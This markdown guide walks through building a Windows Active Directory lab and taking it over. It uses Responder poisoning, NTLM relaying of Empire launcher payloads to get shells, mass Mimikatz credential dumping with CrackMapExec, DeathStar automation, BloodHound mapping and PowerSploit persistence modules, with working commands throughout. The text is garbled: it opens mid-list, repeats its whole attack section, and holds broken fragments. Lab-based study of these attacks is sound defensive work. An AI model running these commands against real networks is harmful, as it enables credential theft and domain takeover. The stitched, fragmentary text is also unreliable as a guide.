- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Includes tools to check for SMB signing.
- [DeathStar](https://github.com/byt3bl33d3r/DeathStar) - Insanely cool tool for automating the "getting DA" process. Still in development, so may not always be stable.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Creating a map of AD. Check the /releases on the GitHub page for precompiled binaries!
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Powershell tools, some are included in Empire already.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Dumping credentials
- [Neo4j](https://neo4j.com/download/) - Database to use with BloodHound

Now you may need to trick a bit with installing the dependencies for all these tools. Familiarize yourself with pip. Make sure you are running tools and scripts with the correct Python version. Certain tools are written for 2.7 and some for 3.

### Passing the hash
The first goal of a Windows pentest is to get a user or a shell as a user.

In a windows AD environment 9 times out of 10 all the workstations share the same local administrator password. You might be really lucky and both the workstations and servers share the same local administrator password as well. At that point it becomes a discovery mission for where the domain admins are logged in.

### Responder attack

Responder does not pick up on



Responder captures NetNTLMv2 hashes. You can not pass the hash with these but you can relay them.

Responder picks up on NetBIOS and LLMNR, because Windows boxes are VERY chatty!
Responder works because the windows box are looking for resources and default to NetBIOS.

Open explorer on the Windows machines and write `\\share\` and wait for the credential prompt. This will trigger a request over SMB to find a resource using the users credentials. That should allow Responder to capture the NetNTLMv2 hash of the user.


### Responder with NTLM relay attack

byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack.
https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used

With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.

- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.


#### Responder

- `Responder -I eth0 -wrf` where eth0 is your interface



https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

#### Empire

Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/

```
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
agents
```

#### NTLMrelay
- NTLMrelay.tx


Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.

#### Back to Empire

Now I have had some trouble where agents are not always spawned or hashes are not captured. Here's what you can try:

- Trigger a few requests from the Windows machines using the `\\share\` trick.
- Restart all the tools.
- Reset Empire's database.
- Reboot the Windows machines.
- Execute the payload from cmd inside a Windows computer to check if it's actually working. (You should get an agent instantly).

Ok, so you have an agent now. Sometimes the interaction with agents in Empire  agent can be painstakingly slow, so have some patience when running commands. Try whoami, sysinfo and other basic commands. Sometimes, the agents timeout and you'll have to spawn new ones. Kill and/or remove old ones using `kill` and `remove`.

Once you have administrator access to a box you can run mimikatz, which is bundled with Empire. If you're lucky you'll get DA creds in plaintext. If you have a local administrator hash on the hosts you can use CrackMapExec to do a mass mimikatz. Basically what it does is a pass the hash on multiple hosts, runs the mimikatz sekurlsa::loggonpasswords and returns output. Hopefully one of them is a DA and game over. Now this might be a bit confusing so lkys37en explained this the following way:

>Say you're an IT administrator. You're logged into your workstation and your account has domain admin rights. I come along and pop a admin shell on another workstation. I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz. If you're running win 7 and 8 I'll get plain text plus NTLM hash. If you're running win 8.1 and above I only get the NTLM hash.

 What this means is that you gain the local admin hash, and pass it to the DC which proves you are admin on DA, which allows you to do mimikatz and extract DA credentials. You're hoping the IT admins used the same local administrator account on all workstations

 To check if the user is part of the Domain Admins group, run `net user "Domain Admins" /domain`

 Now if you're so lucky that you're a DA you can start looking into lateral movement modules in Empire to get into the DC and have some fun.


### DeathStar
I love all the Star Wars references. DeathStar is a pretty new tool for automating the entire process of becoming DA.
[byt3bl33d3r has documented it on his Github](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html).


Basically, you run the NTLMrelay attack from the previous step, but with Empire set up with a REST API. Then you just run DeathStar, grab a coffee and come back as Domain Admin.

Note: I have had some trouble making DeathStar and Empire cooperate. There's a little explanation of why in the DeathStar Github page. Hopefully, it will be stable soon.


### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain. Any user can query Active Directory for groups and sessions.

Now we can use that to make a cool GUI map of the entire AD which can be quirired in using BloodHound.





set up neo4j
https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/

/opt/neo4j-community-3.1.1/bin/neo4j
start neo4j and set new password
edit neo4j.conf
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474

launch bloodhound and log in to neo4j db

powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"

kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages
## Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it

_Mad credz to **lkys37en** from the netsecfocus slack channel for getting me all into this stuff, and eventually making this guide possible._

I strongly you read every step closely, as missing out on certain things can make everything not work as it should.

### VMware or Virtualbox
- Set up a host-only network with DHCP on the host machine.
- Start whatever DHCP service you are running on your host.
- If you're using ESXI or other types of hypervisors, you  probably don't need me telling you what to do.


### Install VMs

Install the following as VMs:

- **W7**
- **W8 or 8.1**
- **W10**
- **WServer 2012 R2**

Set the same password on all accounts, except the Server which will be set up as Domain Admin (DA). Set a stronger password for this one! Service packs and patch levels are not that important for this lab.

Give each machine 2 vCPU, 2 GB RAM and enough storage space. Remember to set the network adapter for the VMs to the host-only network you created. Remember to also add an adapter in the Kali VM settings and make sure it gets an IP. You should be able to ping host from Kali and vice versa.

I'm assuming you already have your Kali VM set up if you intend to hack this.


### Creating a domain and some users

[A good tutorial on setting up a Domain Controller](https://social.technet.microsoft.com/wiki/contents/articles/22622.building-your-first-domain-controller-on-2012-r2.aspx)


- Create a Domain on the Server 2012 R2 machine
- Set it up as a Domain Controller (DC)
- [Create three user accounts in the domain and give them simple names and passwords, like User1:Password1](https://msdn.microsoft.com/en-us/library/aa545262.aspx)
- Set a static IP with DNS pointed to 127.0.0.1



### Adding hosts and users to domain
These steps must be performed for all hosts: W7, W8 and W10.
- Log in as the administrator account on all hosts
- Set the time correctly (this is actually important)
- Disable Windows Defender and Windows Firewall
- Enable network sharing
- Set DNS settings to point to the IP of the DC
- Change the "computer name" to something easy (like W7 for the Windows 7 machine)
-  [Add the hosts to the domain]( https://technet.microsoft.com/en-us/library/bb456990.aspx)
- Add the "Domain Users" group to the administrators group using `net localgroup administrators /add "DOMAIN\Domain Users"`
- To confirm the group was added, run `net localgroup Administrators` and you should see "Domain Users" added to that group
- Log in to each of the domain users you created earlier on the workstations, except one box of your choosing, where you log in as DA
- Ping al the machines back and forth to make sure everything is working. Ping Kali and the host as well.

### Mini guide to Windows hashes
I am no expert in this, but this should cover the basics necessary for this guide:

There are a few different types of hashes in Windows and they can be very confusing.

No windows hashes are salted, so two identical hashes will yield the same plaintext. Windows hashes are broken down into two hashes. LMhash and NTLMhash. This is an example: `testuser:29418:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71`

Broken down:
`username:unique_identifier:LMhash:NTLMhash`

- **LM** - Disabled in W7 and above. However, LM is enabled in memory if the password is less than 15 characters. That's why all recommendations for admin accounts are 15+ chars. LM is old, based on MD4 and easy to crack. The reason is that Windows domains require speed, but that also makes for shit security.
- **NT** -
- **NTLM** - hash for local authentication on hosts. Windows uses the NTLM hash for authentication on the machines across the network
- **NetNTLMv2** - hashes for authentication on the network (SMB)
-


In windows the hashes are stored in memory for single sign-on purposes. Everytime a user clicks on a  network share the creds are passed across the network. We can grab that. The alternative is to always ask the user for credentials, which will never happen in a windows environment.

NTLM hash is just as good as plaintext creds when authenticating to windows machines so it's not that big of a deal if you can't grab plaintext credentials.

Cracking hashes can be a lot of fun, and since most user passwords are shit they can easily be cracked in not too much time. Imagine if the organisation has a password reset policy of 90 days. If you crack a user's credentials in two hours it's a big fail for them. If you can crack a DA's creds in two hours or even a few days it's game over for them. But instead of cracking hashes, we can reuse them by relaying.

### Mini guide to Windows lookups

Now, there are a few different lookup services in Windows.
- **FQDN** - Fully qualified domain name
- **LLMNR**
- **NBT**-NS (NetBIOS Name Service)
- **LLMNR** (Link-Local Multicast Name Resolution)

FQDN is almost another name for DNS name. `share.hacklab.net` is a FQDN.
When a windows machine needs to perform a resource lookup such as a network share it will go in this order FQDN, WINS, NetBIOS and then LLMNR.
Because FQDN lookup is not enabled by default it defaults to WINS and then NetBIOS. The latter is poor man's DNS. In the corporate world a DNS server is available to look up resources, in a home environment it's less likely so if you want to share content between two workstations NetBIOS is how it's done. But because users don't type in share.hacklab.net in their address fields the lookup uses NetBIOS.


### Sharpen your knives
You need a lot of tools for this. Get ready! Make a directory to put all this in, because it can get messy. I won't explain all the tools. Some things you gotta ready yourself.

- [Impacket](https://github.com/CoreSecurity/impacket) - Includes ntlmrelay, which will be useful later.
- [Responder](https://github.com/lgandx/Responder) - Poisons requests.
- [Empire](https://github.com/EmpireProject/Empire) - Imagine it as a Metasploit for Windows hacking.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - Includes tools to check for SMB signing.
- [DeathStar](https://github.com/byt3bl33d3r/DeathStar) - Insanely cool tool for automating the "getting DA" process. Still in development, so may not always be stable.
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - Creating a map of AD. Check the /releases on the GitHub page for precompiled binaries!
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Powershell tools, some are included in Empire already.
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Dumping credentials
- [Neo4j](https://neo4j.com/download/) - Database to use with BloodHound

Now you may need to trick a bit with installing the dependencies for all these tools. Familiarize yourself with pip. Make sure you are running tools and scripts with the correct Python version. Certain tools are written for 2.7 and some for 3.

### Passing the hash
The first goal of a Windows pentest is to get a user or a shell as a user.

In a windows AD environment 9 times out of 10 all the workstations share the same local administrator password. You might be really lucky and both the workstations and servers share the same local administrator password as well. At that point it becomes a discovery mission for where the domain admins are logged in.

### Responder attack

Responder does not pick up on



Responder captures NetNTLMv2 hashes. You can not pass the hash with these but you can relay them.

Responder picks up on NetBIOS and LLMNR, because Windows boxes are VERY chatty!
Responder works because the windows box are looking for resources and default to NetBIOS.

Open explorer on the Windows machines and write `\\share\` and wait for the credential prompt. This will trigger a request over SMB to find a resource using the users credentials. That should allow Responder to capture the NetNTLMv2 hash of the user.


### Responder with NTLM relay attack

byt3bl33d3r is a very prominent figure in this area. He has written some good guides on this attack.
https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

NetNTLMv2 is microsoft's challenge and response protocol. When authenticating to a server the user's hash followed by the server's challenge is used

With relaying hashes you simply take the NetNTLMv2 hash you collected and relay it to a set of hosts and hopefully the user(s) have administrator access. Then you execute a payload and woop de doo you have an admin shell.

- `cme smb <CIDR> --gen-relay-list targets.txt` where the CIDR is your domain subnet. This generates a list where SMB-signing is disabled. The Server versions of Windows have SMB-signing enabled so you can't relay to that one.


#### Responder

- `Responder -I eth0 -wrf` where eth0 is your interface



https://byt3bl33d3r.github.io/practical-guide-to-NTLM-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html

#### Empire

Now getting into Empire should take an hour or so to have it all memorized. A short guide can be found here, but I have a few commands listed below.
https://www.sw1tch.net/2015/08/11/powershellempire-5-minute-quick-start-guide-featuring-kali-linux-andor-debian-8-0/

```
uselistener http
set Port 81
execute
back
usestager multi/launcher
set Listener http
generate
agents
```

#### NTLMrelay
- NTLMrelay.tx


Now copypaste the payload from Empire into the NTLMrelay command above. This will execute the payload for every box it relays to and it should be raining shells very soon. You will see a message in Empire saying it got an agent when it's successful. You will also see hashes written in the terminal while it's running.

#### Back to Empire

Now I have had some trouble where agents are not always spawned or hashes are not captured. Here's what you can try:

- Trigger a few requests from the Windows machines using the `\\share\` trick.
- Restart all the tools.
- Reset Empire's database.
- Reboot the Windows machines.
- Execute the payload from cmd inside a Windows computer to check if it's actually working. (You should get an agent instantly).

Ok, so you have an agent now. Sometimes the interaction with agents in Empire  agent can be painstakingly slow, so have some patience when running commands. Try whoami, sysinfo and other basic commands. Sometimes, the agents timeout and you'll have to spawn new ones. Kill and/or remove old ones using `kill` and `remove`.

Once you have administrator access to a box you can run mimikatz, which is bundled with Empire. If you're lucky you'll get DA creds in plaintext. If you have a local administrator hash on the hosts you can use CrackMapExec to do a mass mimikatz. Basically what it does is a pass the hash on multiple hosts, runs the mimikatz sekurlsa::loggonpasswords and returns output. Hopefully one of them is a DA and game over. Now this might be a bit confusing so lkys37en explained this the following way:

>Say you're an IT administrator. You're logged into your workstation and your account has domain admin rights. I come along and pop a admin shell on another workstation. I grab the hash and do a pass the hash with the local administrator account to your box and then run mimikatz. If you're running win 7 and 8 I'll get plain text plus NTLM hash. If you're running win 8.1 and above I only get the NTLM hash.

 What this means is that you gain the local admin hash, and pass it to the DC which proves you are admin on DA, which allows you to do mimikatz and extract DA credentials. You're hoping the IT admins used the same local administrator account on all workstations

 To check if the user is part of the Domain Admins group, run `net user "Domain Admins" /domain`

 Now if you're so lucky that you're a DA you can start looking into lateral movement modules in Empire to get into the DC and have some fun.


### DeathStar
I love all the Star Wars references. DeathStar is a pretty new tool for automating the entire process of becoming DA.
[byt3bl33d3r has documented it on his Github](https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html).


Basically, you run the NTLMrelay attack from the previous step, but with Empire set up with a REST API. Then you just run DeathStar, grab a coffee and come back as Domain Admin.

Note: I have had some trouble making DeathStar and Empire cooperate. There's a little explanation of why in the DeathStar Github page. Hopefully, it will be stable soon.


### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain. Any user can query Active Directory for groups and sessions.

Now we can use that to make a cool GUI map of the entire AD which can be quirired in using BloodHound.





set up neo4j
https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/

/opt/neo4j-community-3.1.1/bin/neo4j
start neo4j and set new password
edit neo4j.conf
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474

launch bloodhound and log in to neo4j db

powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"

kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages
